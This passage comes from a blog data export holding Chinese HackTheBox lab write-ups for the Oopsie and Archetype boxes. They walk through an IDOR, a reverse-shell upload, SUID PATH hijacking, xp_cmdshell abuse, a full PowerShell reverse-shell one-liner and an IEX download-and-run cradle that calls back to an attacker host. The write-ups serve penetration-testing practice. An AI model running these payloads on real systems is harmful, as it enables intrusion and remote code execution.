src=\"https://i.loli.net/2021/07/27/ZD8N9JvCn3Gtkyc.png\"></p>\n<p>发现80端口开放，在浏览器打开，啥也没有，尝试找登录界面</p>\n<p><img src=\"https://i.loli.net/2021/07/27/bexZV7YuQCfHnJW.png\"></p>\n<p><strong>目录扫描：</strong></p>\n<p>成功找到登录界面</p>\n<p><img src=\"https://i.loli.net/2021/07/27/apWtD5Xlgq4KrkH.png\"></p>\n<p>在bp中也可以看到登录页的js加载记录</p>\n<p><img src=\"https://i.loli.net/2021/07/27/2RtDTbzapGBCWhv.png\"></p>\n<p>在浏览器打开</p>\n<p><img src=\"https://i.loli.net/2021/07/27/5NhiCuwZTcWxtLd.png\"></p>\n<h2 id=\"实验过程\"><a href=\"#实验过程\" class=\"headerlink\" title=\"实验过程\"></a>实验过程</h2><p>账号为<code>admin</code>，密码是上一题中出现过的<code>MEGACORP_4dm1n!!</code>，直接登录，登录后看到有一个上传功能，点击提示需要super admin权限</p>\n<p><img src=\"https://i.loli.net/2021/07/27/ExH9yqfplFRc6be.png\"></p>\n<p>先看一下我们现在账号信息，在url中还可以看到目前的用户id=1</p>\n<p><img src=\"https://i.loli.net/2021/07/27/c4GRbMgQoK1pqf9.png\"></p>\n<p><strong>再抓包看一下</strong>：</p>\n<p>id和user、role对应，可以尝试遍历用户</p>\n<p><img src=\"https://i.loli.net/2021/07/27/NQDFYJsuVKjvtUG.png\"></p>\n<p><strong>发送到interlude模块</strong>，标记id参数，设置好payload开始爆破</p>\n<p><img src=\"https://i.loli.net/2021/07/27/IO7bRopKTVdyeEN.png\"></p>\n<p><img src=\"https://i.loli.net/2021/07/27/jAMXOz6hqZakGB3.png\"></p>\n<p>看到id=30的响应包的长度比较大，看一下他的响应包的内容，确认为super admin用户</p>\n<p><img src=\"https://i.loli.net/2021/07/27/bH7zidyqvxF3sQL.png\"></p>\n<p><img src=\"https://i.loli.net/2021/07/27/Z2itEGU1TQspdwe.png\"></p>\n<p>修改目前用户的user和role值，成功越权到super admin用户</p>\n<p><img src=\"https://i.loli.net/2021/07/27/D4Zw8Bkz39QbPyT.png\"></p>\n<p><img src=\"https://i.loli.net/2021/07/27/EM872nWlGr6Qcux.png\"></p>\n<p>然后尝试上传shell，同样修改当前用户的user和role值，就可以进行文件上传</p>\n<p><img src=\"https://i.loli.net/2021/07/27/qmQXoHtZi2lV1By.png\"></p>\n<p>直接用kali自带的反弹shell文件，修改好ip和port</p>\n<p><img src=\"https://i.loli.net/2021/07/27/dqBTIuL8E36UJXf.png\"></p>\n<p>注意上传的过程中也要修改当前用户的user和role，改成super admin的值，就可以成功上传</p>\n<p><img src=\"https://i.loli.net/2021/07/27/zmrJRpM73eCjV9q.png\"></p>\n<p><img src=\"https://i.loli.net/2021/07/27/hnu7MqHeKplP8oF.png\"></p>\n<p>接下来开启一个监听端口来接收反弹的shell</p>\n<p><img src=\"https://i.loli.net/2021/07/27/qW8BbmrcNsvJwoP.png\"></p>\n<p>然后就是要找到我们上传的shell，扫目录的时候有一个uploads的路径，我们上传的文件应该就在这里</p>\n<p><strong>访问上传的shell来执行</strong></p>\n<p><img src=\"https://i.loli.net/2021/07/27/Kcw1hkTyXuig4r9.png\"></p>\n<p>回到netcat中就可以看到反弹的shell了</p>\n<p><img src=\"https://i.loli.net/2021/07/27/TZQSK9vkXonWIfz.png\"></p>\n<p>拿到shell先看看有没有有用的文件，我们拿到了数据库的账号密码</p>\n<p><img src=\"https://i.loli.net/2021/07/28/wFjIotzpmd9gQBC.png\"></p>\n<p>但是现在的shell是非交互式的，我们接下来要升级到交互的shell，两者的区别如下：</p>\n<pre><code>交互式模式就是shell等待你的输入，并且立即执行你提交的命令，退出后才终止\n非交互式模式就是以shell script方式执行，shell不与你进行交互，而是读取存放在文件中的命令并执行它们，读取到结尾就终止\n</code></pre>\n<pre><code>用netcat获得的shell是非交互式的，不能传递tab来进行补全，不能使用su、nano，也不能执行ctrl+c等命令，所以我们需要升级为交互式的shell\n</code></pre>\n<p>逐条键入命令：</p>\n<pre><code># 将在环境变量下将shell设置为/bin/bash且参数为-q和/dev/null的情况下运行脚本，-q参数为静默运行，输出到/dev/null里，如果不加script -q /dev/null不会新启一个bash，shell=/bin/bash只是设置shell为bash，加了以后会给你挂起一个新的shell，并帮你记录所有内容\nSHELL=/bin/bash script -q /dev/null\n# 将netcat暂挂至后台\nCtrl-Z\n# 将本地终端置于原始模式，以免干扰远程终端\nstty raw -echo\n# 将netcat返回到前台，注意：这里不会显示输入的命令\nfg\n# 重置远程终端，经测试也可以不进行此操作\nreset\n# 运行xterm\nxterm\n</code></pre>\n<p>拿到交互的shell我们就可以切换到Robert用户了</p>\n<p><img src=\"https://i.loli.net/2021/07/28/EdiQx9hAYpDysSk.png\"></p>\n<p><strong>获取普通用户权限的flag</strong></p>\n<p><img src=\"https://i.loli.net/2021/07/28/aEARfWQUJsmChMP.png\"></p>\n<h2 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h2><p>下面我们就要想办法提权，我们先看看这个组里面有没有特殊权限</p>\n<pre><code># -type f 为查找普通文档，-group bugtracker 限定查找的组为bugtracker，2&gt;/dev/null 将错误输出到黑洞（不显示）\nfind / -type f -group bugtracker 2&gt;/dev/null \n# -al 以长格式方式显示并且显示隐藏文件\nls -al /usr/bin/bugtracker           \n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/28/KLmAGangISYdcpb.png\"></p>\n<p><img src=\"https://i.loli.net/2021/07/28/AtRHJfpn6IU7xMg.png\"></p>\n<p>拥有者有<code>s</code>（<code>setuid</code>）特殊权限，可执行的文件搭配这个权限，可以得到特权，任意存取该文件的所有者能使用的全部系统资源，我们尝试运行它，发现这个文件根据提供的<code>ID</code>值输出以该数字为编号的<code>bug</code>报告</p>\n<p><img src=\"https://i.loli.net/2021/07/28/y82ifUD4bzuLOTo.png\"></p>\n<p>接下来我们可以使用<code>strings</code>命令来看看对象文件或二进制文件中查找可打印的字符串</p>\n<p><img src=\"https://i.loli.net/2021/07/28/KLOeI9juaobwQ1W.png\"></p>\n<p>可以看到<code>bugtracker</code>调用了<code>cat</code>命令，输出了<code>/root/reports/</code>目录下的<code>bug</code>报告，其实本来我们当前用户是没有权限访问<code>/root</code>目录的，但是我们有了<code>setuid</code>后就拥有了<code>/root</code>目录的访问有权限，也就拥有了<code>root</code>权限，当前用户执行<code>bugtracker</code>程序是会优先使用当前的<code>path</code>变量，这时候我们就可以在当前用户环境变量<code>指定的路径</code>中搜索<code>cat</code>命令，然后创建一个恶意的<code>cat</code>命令，修改当前用户环境变量，完成提权操作</p>\n<pre><code>export PATH=/tmp:$PATH                //将/tmp目录设置为环境变量\ncd /tmp/                            //切换到/tmp目录下\necho &#39;/bin/sh&#39; &gt; cat                //在此构造恶意的cat命令\nchmod +x cat                        //赋予执行权限\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/28/ghfboUQt6Oe1wd7.png\"></p>\n<p>这样<code>bugtracker</code>再次调用<code>cat</code>命令时实际上调用的是<code>/tmp</code>目录下的恶意的<code>cat</code>命令，我们运行一下<code>bugtracker</code>可以看出，此时<code>robert</code>用户临时具有了<code>root</code>权限，执行<code>id</code>命令发现只是<code>robert</code>用户的<code>uid</code>变为了<code>root</code>，不是真正的<code>root</code>用户</p>\n<p><img src=\"https://i.loli.net/2021/07/28/SbzZWCsydVNm5t9.png\"></p>\n<p>这样我们就可以获取system的flag了</p>\n<p><img src=\"https://i.loli.net/2021/07/28/hs5lVjfuewa1ALJ.png\"></p>\n<p>在/root/.config/filezilla/filezilla.xml文件中有下一题的ftp账号密码</p>\n<p><img src=\"https://i.loli.net/2021/07/28/CEoznHSvYQuDI7F.png\"></p>\n<blockquote>\n<p>参考：</p>\n<p>1、<a href=\"https://www.echocipher.life/index.php/archives/872/\">https://www.echocipher.life/index.php/archives/872/</a></p>\n<p>2、<a href=\"https://www.cnblogs.com/qlqwjy/p/8665871.html\">关于Linux下s、t、i、a权限</a></p>\n<p>3、<a href=\"http://www.361way.com/suid-privilege/5965.html\">LINUX s权限位提权</a></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"实验环境\"><a href=\"#实验环境\" class=\"headerlink\" title=\"实验环境\"></a>实验环境</h2><p><img src=\"https://i.loli.net/2021/07/27/Hd9VUzsDhXpJxSb.png\"></p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p><strong>端口扫描：</strong></p>\n<pre><code>nmap -sT -Pn 10.10.10.28\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/27/ZD8N9JvCn3Gtkyc.png\"></p>\n<p>发现80端口开放，在浏览器打开，啥也没有，尝试找登录界面</p>\n<p><img src=\"https://i.loli.net/2021/07/27/bexZV7YuQCfHnJW.png\"></p>\n<p><strong>目录扫描：</strong></p>\n<p>成功找到登录界面</p>\n<p><img src=\"https://i.loli.net/2021/07/27/apWtD5Xlgq4KrkH.png\"></p>\n<p>在bp中也可以看到登录页的js加载记录</p>\n<p><img src=\"https://i.loli.net/2021/07/27/2RtDTbzapGBCWhv.png\"></p>\n<p>在浏览器打开</p>\n<p><img src=\"https://i.loli.net/2021/07/27/5NhiCuwZTcWxtLd.png\"></p>\n<h2 id=\"实验过程\"><a href=\"#实验过程\" class=\"headerlink\" title=\"实验过程\"></a>实验过程</h2><p>账号为<code>admin</code>，密码是上一题中出现过的<code>MEGACORP_4dm1n!!</code>，直接登录，登录后看到有一个上传功能，点击提示需要super admin权限</p>\n<p><img src=\"https://i.loli.net/2021/07/27/ExH9yqfplFRc6be.png\"></p>\n<p>先看一下我们现在账号信息，在url中还可以看到目前的用户id=1</p>\n<p><img src=\"https://i.loli.net/2021/07/27/c4GRbMgQoK1pqf9.png\"></p>\n<p><strong>再抓包看一下</strong>：</p>\n<p>id和user、role对应，可以尝试遍历用户</p>\n<p><img src=\"https://i.loli.net/2021/07/27/NQDFYJsuVKjvtUG.png\"></p>\n<p><strong>发送到interlude模块</strong>，标记id参数，设置好payload开始爆破</p>\n<p><img src=\"https://i.loli.net/2021/07/27/IO7bRopKTVdyeEN.png\"></p>\n<p><img src=\"https://i.loli.net/2021/07/27/jAMXOz6hqZakGB3.png\"></p>\n<p>看到id=30的响应包的长度比较大，看一下他的响应包的内容，确认为super admin用户</p>\n<p><img src=\"https://i.loli.net/2021/07/27/bH7zidyqvxF3sQL.png\"></p>\n<p><img src=\"https://i.loli.net/2021/07/27/Z2itEGU1TQspdwe.png\"></p>\n<p>修改目前用户的user和role值，成功越权到super admin用户</p>\n<p><img src=\"https://i.loli.net/2021/07/27/D4Zw8Bkz39QbPyT.png\"></p>\n<p><img src=\"https://i.loli.net/2021/07/27/EM872nWlGr6Qcux.png\"></p>\n<p>然后尝试上传shell，同样修改当前用户的user和role值，就可以进行文件上传</p>\n<p><img src=\"https://i.loli.net/2021/07/27/qmQXoHtZi2lV1By.png\"></p>\n<p>直接用kali自带的反弹shell文件，修改好ip和port</p>\n<p><img src=\"https://i.loli.net/2021/07/27/dqBTIuL8E36UJXf.png\"></p>\n<p>注意上传的过程中也要修改当前用户的user和role，改成super admin的值，就可以成功上传</p>\n<p><img src=\"https://i.loli.net/2021/07/27/zmrJRpM73eCjV9q.png\"></p>\n<p><img src=\"https://i.loli.net/2021/07/27/hnu7MqHeKplP8oF.png\"></p>\n<p>接下来开启一个监听端口来接收反弹的shell</p>\n<p><img src=\"https://i.loli.net/2021/07/27/qW8BbmrcNsvJwoP.png\"></p>\n<p>然后就是要找到我们上传的shell，扫目录的时候有一个uploads的路径，我们上传的文件应该就在这里</p>\n<p><strong>访问上传的shell来执行</strong></p>\n<p><img src=\"https://i.loli.net/2021/07/27/Kcw1hkTyXuig4r9.png\"></p>\n<p>回到netcat中就可以看到反弹的shell了</p>\n<p><img src=\"https://i.loli.net/2021/07/27/TZQSK9vkXonWIfz.png\"></p>\n<p>拿到shell先看看有没有有用的文件，我们拿到了数据库的账号密码</p>\n<p><img src=\"https://i.loli.net/2021/07/28/wFjIotzpmd9gQBC.png\"></p>\n<p>但是现在的shell是非交互式的，我们接下来要升级到交互的shell，两者的区别如下：</p>\n<pre><code>交互式模式就是shell等待你的输入，并且立即执行你提交的命令，退出后才终止\n非交互式模式就是以shell script方式执行，shell不与你进行交互，而是读取存放在文件中的命令并执行它们，读取到结尾就终止\n</code></pre>\n<pre><code>用netcat获得的shell是非交互式的，不能传递tab来进行补全，不能使用su、nano，也不能执行ctrl+c等命令，所以我们需要升级为交互式的shell\n</code></pre>\n<p>逐条键入命令：</p>\n<pre><code># 将在环境变量下将shell设置为/bin/bash且参数为-q和/dev/null的情况下运行脚本，-q参数为静默运行，输出到/dev/null里，如果不加script -q /dev/null不会新启一个bash，shell=/bin/bash只是设置shell为bash，加了以后会给你挂起一个新的shell，并帮你记录所有内容\nSHELL=/bin/bash script -q /dev/null\n# 将netcat暂挂至后台\nCtrl-Z\n# 将本地终端置于原始模式，以免干扰远程终端\nstty raw -echo\n# 将netcat返回到前台，注意：这里不会显示输入的命令\nfg\n# 重置远程终端，经测试也可以不进行此操作\nreset\n# 运行xterm\nxterm\n</code></pre>\n<p>拿到交互的shell我们就可以切换到Robert用户了</p>\n<p><img src=\"https://i.loli.net/2021/07/28/EdiQx9hAYpDysSk.png\"></p>\n<p><strong>获取普通用户权限的flag</strong></p>\n<p><img src=\"https://i.loli.net/2021/07/28/aEARfWQUJsmChMP.png\"></p>\n<h2 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h2><p>下面我们就要想办法提权，我们先看看这个组里面有没有特殊权限</p>\n<pre><code># -type f 为查找普通文档，-group bugtracker 限定查找的组为bugtracker，2&gt;/dev/null 将错误输出到黑洞（不显示）\nfind / -type f -group bugtracker 2&gt;/dev/null \n# -al 以长格式方式显示并且显示隐藏文件\nls -al /usr/bin/bugtracker           \n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/28/KLmAGangISYdcpb.png\"></p>\n<p><img src=\"https://i.loli.net/2021/07/28/AtRHJfpn6IU7xMg.png\"></p>\n<p>拥有者有<code>s</code>（<code>setuid</code>）特殊权限，可执行的文件搭配这个权限，可以得到特权，任意存取该文件的所有者能使用的全部系统资源，我们尝试运行它，发现这个文件根据提供的<code>ID</code>值输出以该数字为编号的<code>bug</code>报告</p>\n<p><img src=\"https://i.loli.net/2021/07/28/y82ifUD4bzuLOTo.png\"></p>\n<p>接下来我们可以使用<code>strings</code>命令来看看对象文件或二进制文件中查找可打印的字符串</p>\n<p><img src=\"https://i.loli.net/2021/07/28/KLOeI9juaobwQ1W.png\"></p>\n<p>可以看到<code>bugtracker</code>调用了<code>cat</code>命令，输出了<code>/root/reports/</code>目录下的<code>bug</code>报告，其实本来我们当前用户是没有权限访问<code>/root</code>目录的，但是我们有了<code>setuid</code>后就拥有了<code>/root</code>目录的访问有权限，也就拥有了<code>root</code>权限，当前用户执行<code>bugtracker</code>程序是会优先使用当前的<code>path</code>变量，这时候我们就可以在当前用户环境变量<code>指定的路径</code>中搜索<code>cat</code>命令，然后创建一个恶意的<code>cat</code>命令，修改当前用户环境变量，完成提权操作</p>\n<pre><code>export PATH=/tmp:$PATH                //将/tmp目录设置为环境变量\ncd /tmp/                            //切换到/tmp目录下\necho &#39;/bin/sh&#39; &gt; cat                //在此构造恶意的cat命令\nchmod +x cat                        //赋予执行权限\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/28/ghfboUQt6Oe1wd7.png\"></p>\n<p>这样<code>bugtracker</code>再次调用<code>cat</code>命令时实际上调用的是<code>/tmp</code>目录下的恶意的<code>cat</code>命令，我们运行一下<code>bugtracker</code>可以看出，此时<code>robert</code>用户临时具有了<code>root</code>权限，执行<code>id</code>命令发现只是<code>robert</code>用户的<code>uid</code>变为了<code>root</code>，不是真正的<code>root</code>用户</p>\n<p><img src=\"https://i.loli.net/2021/07/28/SbzZWCsydVNm5t9.png\"></p>\n<p>这样我们就可以获取system的flag了</p>\n<p><img src=\"https://i.loli.net/2021/07/28/hs5lVjfuewa1ALJ.png\"></p>\n<p>在/root/.config/filezilla/filezilla.xml文件中有下一题的ftp账号密码</p>\n<p><img src=\"https://i.loli.net/2021/07/28/CEoznHSvYQuDI7F.png\"></p>\n<blockquote>\n<p>参考：</p>\n<p>1、<a href=\"https://www.echocipher.life/index.php/archives/872/\">https://www.echocipher.life/index.php/archives/872/</a></p>\n<p>2、<a href=\"https://www.cnblogs.com/qlqwjy/p/8665871.html\">关于Linux下s、t、i、a权限</a></p>\n<p>3、<a href=\"http://www.361way.com/suid-privilege/5965.html\">LINUX s权限位提权</a></p>\n</blockquote>\n"},{"title":"HackTheBox-Archetype","date":"2021-07-13T09:05:21.000Z","_content":"\n## 实验环境\n\n![](https://i.loli.net/2021/07/12/m1YO5GTBC6jqoPt.png)\n\n## 实验过程\n\n### 信息收集\n\n#### nmap扫描：\n\n```\nnmap -sC -sV 10.10.10.27\n```\n\n-sC：使用默认脚本进行扫描，等同于–script=default\n-sV：探测开启的端口来获取服务、版本信息\n\n![](https://i.loli.net/2021/07/12/zqbrwsZEfTkXcOY.png)\n\n可以看到开放端口有四个：135、139、445、1433，1433是SQL Server数据库默认使用的端口，445是文件共享协议（SMB）默认使用的端口\n\n#### 445端口匿名访问\n\n测试445端口的SMB服务是否支持匿名访问，没有经过权限配置可能默认允许所有人无需身份认证来匿名访问共享资源，使用smbclient来访问samba服务器的共享资源：\n\n```\nsmbclient -N -L //10.10.10.27/\n```\n\n-N：匿名登录\n-L：获取共享资源列表\n\n![](https://i.loli.net/2021/07/12/NSm3xJlXt7sMAK4.png)\n\n可以看到存在一个backups目录，使用smbclient来访问：\n\n```\nsmbclient -N //10.10.10.27/backups\n```\n\n![](https://i.loli.net/2021/07/12/A8cunJbwH3BphVX.png)\n\n发现存在一个prod.dtsConfig文件,使用get命令下载到本地，查看文件内容，可以看到数据库配置信息：\n\n![](https://i.loli.net/2021/07/12/o17Mu3zfOnsZ5x8.png)\n\n### impacket工具的使用\n\n> 下载地址：https://github.com/SecureAuthCorp/impacket/tree/master\n\n**安装**：\n\n进入impacket目录，执行：\n\n```\npip install .\n```\n\n![](https://i.loli.net/2021/07/12/RGXP5Qjl3h6a7WM.png)\n\n用前面获得的账号和密码登录：\n\n```\nmssqlclient.py sql_svc@10.10.10.27 -windows-auth\n```\n\n![](https://i.loli.net/2021/07/12/JyWYrKpMLvNV1P2.png)\n\n判断当前是否拥有sysadmin权限：\n\n```\nSELECT IS_SRVROLEMEMBER('sysadmin')\n```\n\n![](https://i.loli.net/2021/07/12/zZmAQyGdqRb5cfC.png)\n\n返回值是1，代表true，说明当前用户具有sysadmin权限，能够在靶机上使用SQL Server的xp_cmdshell来进行远程代码执行\n\n### 使用数据库调用系统命令\n\n依次写入：\n\n```\nEXEC sp_configure 'Show Advanced Options', 1;\t\t\t\\\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项\nreconfigure;\t\t\t\t\t\t\t\t\t\t\t\\\\确认上面的操作\nsp_configure;\t\t\t\t\t\t\t\t\t\t\t\\\\查看当前sp_configure配置情况\nEXEC sp_configure 'xp_cmdshell', 1\t\t\t\t\t\t\\\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令\nreconfigure;\t\t\t\t\t\t\t\t\t\t\t\\\\确认上面的操作\nxp_cmdshell \"whoami\" \t\t\t\t\t\t\t\t\t\\\\在靶机上调用cmdshell执行whoami\n```\n\n执行结束后，SQL会返回当前数据库进程的操作系统用户为archetype\\sql_svc\n\n![](https://i.loli.net/2021/07/12/aIbOdf4lZ71eHyq.png)\n\n### 获得操作系统普通用户权限\n\n我们已经可以在数据库执行系统命令，接下来我们需要反弹一个操作系统shell；\n\n在桌面新建一个powershell的反弹shell文件shell.ps1（**注意将其中的ip修改为HTB分配的ip**）\n\n代码如下：\n\n```\n$client = New-Object System.Net.Sockets.TCPClient(\"10.10.14.55\",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"# \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n```\n\n下面我们搭建一个http服务器，让靶机下载我们的shell.ps1文件；\n\n因为我的shell.ps1文件在桌面，所以也在桌面终端执行搭建http服务器的命令：\n\n```\npython3 -m http.server 80\n```\n\n![](https://i.loli.net/2021/07/12/BPoClYzDI3T18qk.png)\n\n然后开启一个监听端口，用来接收反弹的shell：\n\n```\nnc -lvvp 443\n```\n\n![](https://i.loli.net/2021/07/12/SiAqEx789zZYwKJ.png)\n\n接着在数据库shell中执行如下命令，反弹shell：\n\n```\nxp_cmdshell \"powershell \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://10.10.14.55/shell.ps1\\\");\"\n```\n\n![](https://i.loli.net/2021/07/12/fHnUJF6gtxzmbEO.png)\n\n### 获取普通用户权限的flag\n\n在nc接收的shell中直接执行下面的命令：\n\n```\ntype C:\\Users\\sql_svc\\Desktop\\user.txt\n```\n\n![](https://i.loli.net/2021/07/12/L9siVhJlfBKYGam.png)\n\n### 获取系统权限用户的flag\n\n使用下面的命令来访问PowerShell历史记录文件：\n\n```\ntype C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\n```\n\n![](https://i.loli.net/2021/07/12/Dc6TqQ7bRgAkK9d.png)\n\n发现administrator用户登录后将共享文件夹\\Archetype\\backups映射到T盘，后面是administrator用户名和它的密码，可以使用Impacket中的psexec.py来提权：\n\n```\npsexec.py administrator@10.10.10.27\n```\n\n输入上面获得的密码就可以成功提权\n\n![](https://i.loli.net/2021/07/12/BZmn8vYqEpbcW1k.png)\n\n执行如下命令获得flag：\n\n```\ntype C:\\Users\\Administrator\\Desktop\\root.txt\n```\n\n![](https://i.loli.net/2021/07/12/lBtDMgWAsP2nTLb.png)\n\n\n\n> 参考：\n>\n> https://blog.csdn.net/qq_45951598/article/details/115269502\n","source":"_posts/HackTheBox-Archetype.md","raw":"---\ntitle: HackTheBox-Archetype\ndate: 2021-07-13 17:05:21\ncategories:\n- 渗透测试\ntags:\n- HackTheBox\n---\n\n## 实验环境\n\n![](https://i.loli.net/2021/07/12/m1YO5GTBC6jqoPt.png)\n\n## 实验过程\n\n### 信息收集\n\n#### nmap扫描：\n\n```\nnmap -sC -sV 10.10.10.27\n```\n\n-sC：使用默认脚本进行扫描，等同于–script=default\n-sV：探测开启的端口来获取服务、版本信息\n\n![](https://i.loli.net/2021/07/12/zqbrwsZEfTkXcOY.png)\n\n可以看到开放端口有四个：135、139、445、1433，1433是SQL Server数据库默认使用的端口，445是文件共享协议（SMB）默认使用的端口\n\n#### 445端口匿名访问\n\n测试445端口的SMB服务是否支持匿名访问，没有经过权限配置可能默认允许所有人无需身份认证来匿名访问共享资源，使用smbclient来访问samba服务器的共享资源：\n\n```\nsmbclient -N -L //10.10.10.27/\n```\n\n-N：匿名登录\n-L：获取共享资源列表\n\n![](https://i.loli.net/2021/07/12/NSm3xJlXt7sMAK4.png)\n\n可以看到存在一个backups目录，使用smbclient来访问：\n\n```\nsmbclient -N //10.10.10.27/backups\n```\n\n![](https://i.loli.net/2021/07/12/A8cunJbwH3BphVX.png)\n\n发现存在一个prod.dtsConfig文件,使用get命令下载到本地，查看文件内容，可以看到数据库配置信息：\n\n![](https://i.loli.net/2021/07/12/o17Mu3zfOnsZ5x8.png)\n\n### impacket工具的使用\n\n> 下载地址：https://github.com/SecureAuthCorp/impacket/tree/master\n\n**安装**：\n\n进入impacket目录，执行：\n\n```\npip install .\n```\n\n![](https://i.loli.net/2021/07/12/RGXP5Qjl3h6a7WM.png)\n\n用前面获得的账号和密码登录：\n\n```\nmssqlclient.py sql_svc@10.10.10.27 -windows-auth\n```\n\n![](https://i.loli.net/2021/07/12/JyWYrKpMLvNV1P2.png)\n\n判断当前是否拥有sysadmin权限：\n\n```\nSELECT IS_SRVROLEMEMBER('sysadmin')\n```\n\n![](https://i.loli.net/2021/07/12/zZmAQyGdqRb5cfC.png)\n\n返回值是1，代表true，说明当前用户具有sysadmin权限，能够在靶机上使用SQL Server的xp_cmdshell来进行远程代码执行\n\n### 使用数据库调用系统命令\n\n依次写入：\n\n```\nEXEC sp_configure 'Show Advanced Options', 1;\t\t\t\\\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项\nreconfigure;\t\t\t\t\t\t\t\t\t\t\t\\\\确认上面的操作\nsp_configure;\t\t\t\t\t\t\t\t\t\t\t\\\\查看当前sp_configure配置情况\nEXEC sp_configure 'xp_cmdshell', 1\t\t\t\t\t\t\\\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令\nreconfigure;\t\t\t\t\t\t\t\t\t\t\t\\\\确认上面的操作\nxp_cmdshell \"whoami\" \t\t\t\t\t\t\t\t\t\\\\在靶机上调用cmdshell执行whoami\n```\n\n执行结束后，SQL会返回当前数据库进程的操作系统用户为archetype\\sql_svc\n\n![](https://i.loli.net/2021/07/12/aIbOdf4lZ71eHyq.png)\n\n### 获得操作系统普通用户权限\n\n我们已经可以在数据库执行系统命令，接下来我们需要反弹一个操作系统shell；\n\n在桌面新建一个powershell的反弹shell文件shell.ps1（**注意将其中的ip修改为HTB分配的ip**）\n\n代码如下：\n\n```\n$client = New-Object System.Net.Sockets.TCPClient(\"10.10.14.55\",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"# \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n```\n\n下面我们搭建一个http服务器，让靶机下载我们的shell.ps1文件；\n\n因为我的shell.ps1文件在桌面，所以也在桌面终端执行搭建http服务器的命令：\n\n```\npython3 -m http.server 80\n```\n\n![](https://i.loli.net/2021/07/12/BPoClYzDI3T18qk.png)\n\n然后开启一个监听端口，用来接收反弹的shell：\n\n```\nnc -lvvp 443\n```\n\n![](https://i.loli.net/2021/07/12/SiAqEx789zZYwKJ.png)\n\n接着在数据库shell中执行如下命令，反弹shell：\n\n```\nxp_cmdshell \"powershell \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://10.10.14.55/shell.ps1\\\");\"\n```\n\n![](https://i.loli.net/2021/07/12/fHnUJF6gtxzmbEO.png)\n\n### 获取普通用户权限的flag\n\n在nc接收的shell中直接执行下面的命令：\n\n```\ntype C:\\Users\\sql_svc\\Desktop\\user.txt\n```\n\n![](https://i.loli.net/2021/07/12/L9siVhJlfBKYGam.png)\n\n### 获取系统权限用户的flag\n\n使用下面的命令来访问PowerShell历史记录文件：\n\n```\ntype C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\n```\n\n![](https://i.loli.net/2021/07/12/Dc6TqQ7bRgAkK9d.png)\n\n发现administrator用户登录后将共享文件夹\\Archetype\\backups映射到T盘，后面是administrator用户名和它的密码，可以使用Impacket中的psexec.py来提权：\n\n```\npsexec.py administrator@10.10.10.27\n```\n\n输入上面获得的密码就可以成功提权\n\n![](https://i.loli.net/2021/07/12/BZmn8vYqEpbcW1k.png)\n\n执行如下命令获得flag：\n\n```\ntype C:\\Users\\Administrator\\Desktop\\root.txt\n```\n\n![](https://i.loli.net/2021/07/12/lBtDMgWAsP2nTLb.png)\n\n\n\n> 参考：\n>\n> https://blog.csdn.net/qq_45951598/article/details/115269502\n","slug":"HackTheBox-Archetype","published":1,"updated":"2021-12-25T12:19:50.095Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl5up2nyb0005wku14ue7g7va","content":"<h2 id=\"实验环境\"><a href=\"#实验环境\" class=\"headerlink\" title=\"实验环境\"></a>实验环境</h2><p><img src=\"https://i.loli.net/2021/07/12/m1YO5GTBC6jqoPt.png\"></p>\n<h2 id=\"实验过程\"><a href=\"#实验过程\" class=\"headerlink\" title=\"实验过程\"></a>实验过程</h2><h3 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><h4 id=\"nmap扫描：\"><a href=\"#nmap扫描：\" class=\"headerlink\" title=\"nmap扫描：\"></a>nmap扫描：</h4><pre><code>nmap -sC -sV 10.10.10.27\n</code></pre>\n<p>-sC：使用默认脚本进行扫描，等同于–script=default<br>-sV：探测开启的端口来获取服务、版本信息</p>\n<p><img src=\"https://i.loli.net/2021/07/12/zqbrwsZEfTkXcOY.png\"></p>\n<p>可以看到开放端口有四个：135、139、445、1433，1433是SQL Server数据库默认使用的端口，445是文件共享协议（SMB）默认使用的端口</p>\n<h4 id=\"445端口匿名访问\"><a href=\"#445端口匿名访问\" class=\"headerlink\" title=\"445端口匿名访问\"></a>445端口匿名访问</h4><p>测试445端口的SMB服务是否支持匿名访问，没有经过权限配置可能默认允许所有人无需身份认证来匿名访问共享资源，使用smbclient来访问samba服务器的共享资源：</p>\n<pre><code>smbclient -N -L 